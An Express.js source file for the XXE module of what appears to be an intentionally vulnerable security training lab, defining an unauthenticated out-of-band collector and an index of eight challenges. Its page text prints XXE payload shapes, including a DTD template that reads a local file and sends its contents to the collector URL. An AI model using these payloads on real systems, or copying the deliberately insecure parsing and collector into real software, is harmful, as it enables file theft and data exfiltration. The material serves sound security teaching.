'use strict';
// XXE Injection: an intentionally vulnerable XML importer with a hand-rolled,
// regex-based entity expander. Thin aggregator: every challenge lives in
// ./challenges/* and the module-level OOB collector plus the index page live
// here. The collector routes and helpers were ported verbatim from the legacy
// modules/xxe/router.js (now deleted); every route that reads or writes the
// pingback log uses the single oobLog array from ./shared (same identity
// everywhere, so out-of-band flags stay reachable).
const express = require('express');
const { brief, difficultyPill, esc, hintLadder, page, toolsPill, trackBanner, easyFirst, cardConsoles, startBlock, consoleBtn, fixSection , capturedPill } = require('../../lib/page');
const { SECRET_ABS, oobLog, pingbackOwnedBy } = require('./shared');

const challenges = [
  require('./challenges/file'),
  require('./challenges/ssrf'),
  require('./challenges/xxe-billion-laughs'),
  require('./challenges/xxe-external-dtd'),
  require('./challenges/xxe-svg'),
  require('./challenges/xxe-xinclude'),
  require('./challenges/xxe-param-oob'),
  require('./challenges/xxe-soap'),
];

const router = express.Router();

// ---- Module-level in-lab OOB collector -----------------------------------
// VULN: the collector accepts attacker DTDs and logs attacker-controlled data
// with no auth; it exists so learners can practice real out-of-band
// exfiltration inside the lab. It is not part of any single challenge: both
// the external-DTD and the parameter-entity OOB challenges ping it.
// Hosted-DTD slot, per session (P1-1): one student's DTD upload no longer
// replaces the DTD every other student is pulling. Each session gets its
// own URL, /xxe/collector/dtd/<session id>, shown on the collector page;
// the fetch the XML parser makes for a student's DTD URL therefore always
// returns that student's DTD.
const { createSessionState } = require('../../lib/session-state');
const DEFAULT_DTD = '<!ENTITY demo "upload your malicious DTD below">';
const hostedDtds = createSessionState(() => ({ text: DEFAULT_DTD }));

router.get('/collector/log', (req, res) => {
  const d = String(req.query.d || '').slice(0, 500);
  oobLog.push({ time: new Date().toISOString(), d, ip: req.ip });
  if (oobLog.length > 100) oobLog.splice(0, oobLog.length - 100);
  res.type('text/plain').send('logged');
});

// Plain /collector/dtd: a browser preview of the caller's own hosted DTD
// (or the default placeholder for a session that has not hosted one).
router.get('/collector/dtd', (req, res) => {
  res.type('text/plain').send(hostedDtds.get(req).text);
});

// Per-session DTD URL: the session id is unguessable, so the URL itself is
// the capability. The lab's parser fetches it with no cookies; any session
// that knows the URL (only its owner is ever shown it) may fetch it.
router.get('/collector/dtd/:sid', (req, res) => {
  const held = hostedDtds.peekSid(String(req.params.sid || ''));
  if (held && held.text !== DEFAULT_DTD) {
    return res.type('text/plain').send(held.text);
  }
  return res.status(404).type('text/plain').send('no DTD hosted for this session');
});

router.post('/collector/dtd', (req, res) => {
  // Per-session slot: this session's DTD no longer replaces anyone else's.
  // get() pins the session (Set-Cookie on the response), so the student's
  // per-session URL keeps working afterwards.
  hostedDtds.get(req).text = String(req.body.dtd || '').slice(0, 5000);
  res.redirect('/xxe/collector');
});

router.get('/collector', (req, res) => {
  const base = `http://${req.get('host')}`;
  // Per-session DTD URL (P1-1): every session gets its own slot, so one
  // student's DTD never replaces another's. get() also pins the session.
  const dtdUrl = `${base}/xxe/collector/dtd/${req.sessionID}`;
  const myDtd = hostedDtds.get(req).text;
  // Per-session isolation: a student only ever sees pingbacks their own
  // session's imports caused. Other students' entries are never echoed, so
  // no one can read another student's exfiltrated marker text here.
  const rows = oobLog.slice().reverse()
    .filter((e) => pingbackOwnedBy(e.d, req.sessionID))
    .map((e) => `
    <tr><td>${esc(e.time)}</td><td>${esc(e.ip)}</td><td><code>${esc(e.d)}</code></td></tr>`).join('')
    || '<tr><td colspan="3"><i>no pingbacks from your session yet</i></td></tr>';
  const dtdTemplate = `<!ENTITY % file SYSTEM "file:///PATH/TO/A/FILE">\n<!ENTITY pingback SYSTEM "${base}/xxe/collector/log?d=%file;">`;
  res.send(page('OOB Collector', `
    <h2>Out-of-band collector</h2>
    ${brief('What is this?', `
      <p>Some XXE attacks never show stolen data in the response. Instead the parsed XML
      makes the <b>server</b> send the data somewhere else: this collector is that
      "somewhere else". It does two jobs:</p>
      <ol>
        <li><b>Hosts your malicious DTD</b> at <code>${esc(dtdUrl)}</code> (upload below).</li>
        <li><b>Logs pingbacks</b>: any request to <code>/xxe/collector/log?d=...</code>
        is recorded in the table below, so you can see exfiltrated data arrive.</li>
      </ol>`)}
    <h3>1. Host your DTD</h3>
    <form method="POST" action="/xxe/collector/dtd" class="clay-card">
      <div class="clay-field">
        <label for="dtd">DTD to host</label>
        <textarea class="clay-input" id="dtd" name="dtd" rows="6" placeholder="paste your DTD here">${esc(myDtd)}</textarea>
      </div>
      <button class="clay-btn clay-btn-primary" type="submit">Host this DTD</button>
    </form>
    <p class="dim">Currently hosted at <code>${esc(dtdUrl)}</code> (your session's own slot: other students have their own)</p>
    <p>DTD shape (your hosted DTD needs one declaration that reads a file into
    <code>%file;</code>, and a second that pings this collector back with it in the URL;
    the target path is yours to supply):</p>
    <pre><code>${esc(dtdTemplate)}</code></pre>
    <h3>2. Pingback log</h3>
    <table><tr><th>Time</th><th>From</th><th>d=</th></tr>${rows}</table>
    <p><a class="clay-btn clay-btn-secondary clay-btn-sm" href="/xxe">Back to XXE module</a></p>
  `));
});

// GET /xxe -> module index page.
router.get('/', (req, res) => {
  const ordered = easyFirst(challenges);
  // The SSRF challenge registers no routes of its own: it shares the XML
  // importer console with the file-read challenge (see challenges/ssrf.js),
  // so point its card at that shared console explicitly (P4-4).
  const consoles = cardConsoles('xxe', ordered, { ssrf: '/xxe/import' });
  const cards = ordered.map(({ vuln: v }, i) => `
    <article class="vuln-card" id="${esc(v.id)}">
      <h3>${esc(v.name)} ${difficultyPill(v.difficulty)} ${capturedPill(req, 'xxe', v.id)}</h3>
      <p>${esc(v.how)}</p>
      ${startBlock(v, consoles[i])}
      ${hintLadder(v)}
      ${toolsPill(v)}
      ${consoleBtn('Open challenge', consoles[i])}
    </article>`).join('');


  res.send(page('XXE Injection', `
    ${brief('XXE Injection', `
      This app imports XML using a <b>hand-rolled, regex-based entity expander</b>.
      It honors <code>&lt;!ENTITY name SYSTEM "file://..."&gt;</code> and
      <code>http://</code> URIs, then substitutes <code>&amp;name;</code>
      references directly into the parsed output. No allowlists, no DTD hardening.
      <br><br>Shape of the primitive (paths and values are yours to discover):
      <pre><code>&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM "file:///PATH/TO/A/FILE"&gt;]&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;</code></pre>
      For the SSRF challenge, point a <code>http://</code> entity at the SSRF module's
      internal secret endpoint and look for the leaked secret in the output.`)}
    ${trackBanner(module.exports)}

    <h2>Challenges</h2>
    <p>Eight XML endpoints, eight ways to turn a parser against its server: file reads,
    SSRF chaining, entity-expansion DoS, DTD tricks, SVG and SOAP wrappers, XInclude,
    and out-of-band exfiltration. Each challenge card has a hint ladder: level 1 nudges,
    level 2 teaches the technique, level 3 shows the payload shape.</p>
    ${cards}

    <h2>Quick links</h2>
    <ul>
      <li><a href="/xxe/import">XML Importer</a> (shared by the file-read and SSRF challenges)</li>
      <li><a href="/xxe/billion">Billion laughs</a> (entity-expansion DoS)</li>
      <li><a href="/xxe/dtd">External DTD</a> (host your DTD on the collector first)</li>
      <li><a href="/xxe/svg">SVG text extractor</a></li>
      <li><a href="/xxe/xinclude">XInclude importer</a></li>
      <li><a href="/xxe/param">Advanced XML import</a> (inline parameter entities)</li>
      <li><a href="/xxe/soap">SOAP status service</a></li>
      <li><a href="/xxe/collector">OOB collector</a> (host DTDs, watch pingbacks land)</li>
    </ul>
  ${fixSection('xxe', challenges)}
`));
});

for (const c of challenges) router.use(c.router);

module.exports = {
  id: 'xxe',
  name: 'XXE Injection',
  tagline: 'Trick a naive XML parser into reading files and hitting internal URLs.',
  description: 'The XML importer expands external entities with a hand-rolled regex parser: file:// URIs are read from disk and http:// URIs are fetched server-side. Use it to read a local secret file, then chain into the SSRF module\'s internal endpoint.',
  difficulty: 'Intermediate',
  track: 'Injection',
  prerequisites: ['sqli'],
  vulns: challenges.map((c) => c.vuln),
  router,
};
